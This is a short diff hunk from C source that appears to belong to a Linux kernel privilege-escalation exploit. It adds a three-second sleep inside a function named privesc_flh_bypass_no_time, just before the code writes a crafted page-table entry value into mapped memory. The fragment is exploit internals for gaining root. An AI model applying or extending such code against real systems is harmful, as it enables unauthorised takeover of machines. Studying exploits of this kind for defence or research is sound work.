@@ -371,7 +371,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 		return;
 	}
-	
+	sleep(3);
 	// set new pte value for sanity check
 	*pte_area = 0x0 | 0x8000000000000867;
 
